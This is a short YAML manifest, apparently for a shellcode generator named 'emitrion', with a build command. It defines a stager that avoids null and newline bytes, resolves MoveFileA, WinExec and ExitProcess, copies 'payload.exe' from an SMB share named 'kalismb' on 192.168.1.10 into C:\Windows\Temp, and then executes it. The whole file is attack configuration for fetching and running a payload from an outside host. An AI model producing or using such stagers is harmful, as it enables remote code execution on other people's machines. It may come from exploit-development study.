template: ir_move_then_run
# IR workflow: MoveFileA + WinExec with exit strategy.
#
# Build:
#   uv run emitrion emitrion/manifests/ir_move_then_run.yaml \
#       --src "\\\\192.168.1.10\\kalismb\\payload.exe" \
#       --dst "C:\\Windows\\Temp\\payload.exe" \
#       --out emitter_out/
badchars: ["00", "0a", "0d"]

functions:
  - MoveFileA
  - WinExec
  - ExitProcess

strings:
  - label: src_path
    value: "\\\\192.168.1.10\\kalismb\\payload.exe"
    method: mov
    dest: edi
  - label: dst_path
    value: "C:\\Windows\\Temp\\payload.exe"
    method: mov
    dest: edi
